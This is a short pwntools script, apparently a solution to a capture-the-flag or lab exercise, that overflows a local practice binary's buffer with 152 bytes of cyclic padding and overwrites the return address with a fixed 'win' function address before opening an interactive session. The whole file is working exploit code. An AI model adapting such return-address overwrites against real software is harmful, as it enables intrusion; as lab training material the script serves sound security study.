#!/usr/bin/python

from pwn import *

trash = cyclic(152)
win = p64(0x4015fb)
payload = trash + win

p = process("/challenge/exercise1/vuln")

p.sendline(b"160")
p.sendline(payload)

p.interactive()
